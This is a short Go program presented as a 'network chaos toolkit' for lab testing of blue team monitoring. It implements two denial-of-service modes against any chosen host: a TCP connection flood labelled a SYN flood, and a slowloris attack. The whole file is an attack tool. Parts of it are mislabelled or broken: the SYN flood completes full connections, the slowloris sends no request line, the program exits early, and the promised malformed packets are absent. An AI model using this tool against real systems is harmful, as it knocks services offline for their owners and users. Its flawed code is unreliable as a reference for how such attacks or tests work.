// GoNuke - Network Chaos Toolkit (Lab Use Only)
// Description: Tool to test blue team monitoring by generating network noise like SYN floods, malformed packets, slow HTTP attacks, etc.

package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"strings"
	"time"
)

var (
	targetHost = flag.String("host", "127.0.0.1", "Target IP address or hostname")
	targetPort = flag.String("port", "80", "Target port")
	attackType = flag.String("mode", "syn", "Attack type: syn | slowloris")
	duration   = flag.Int("duration", 30, "Duration of attack in seconds")
)

func main() {
	flag.Parse()

	fmt.Printf("[+] Starting %s attack on %s:%s for %d seconds\n", *attackType, *targetHost, *targetPort, *duration)
	switch strings.ToLower(*attackType) {
	case "syn":
		startSynFlood(*targetHost, *targetPort, *duration)
	case "slowloris":
		startSlowloris(*targetHost, *targetPort, *duration)
	default:
		log.Fatalf("Unknown mode: %s\n", *attackType)
	}
}

func startSynFlood(host, port string, seconds int) {
	end := time.Now().Add(time.Duration(seconds) * time.Second)
	for time.Now().Before(end) {
		go func() {
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", host, port), 2*time.Second)
			if err == nil {
				conn.Close()
			}
		}()
	}
	fmt.Println("[+] SYN flood finished")
}

func startSlowloris(host, port string, seconds int) {
	end := time.Now().Add(time.Duration(seconds) * time.Second)
	for i := 0; i < 100; i++ {
		go func() {
			conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", host, port))
			if err != nil {
				return
			}
			for time.Now().Before(end) {
				_, _ = conn.Write([]byte("X-a: b\r\n"))
				time.Sleep(10 * time.Second)
			}
			conn.Close()
		}()
	}
	fmt.Println("[+] Slowloris attack finished")
}
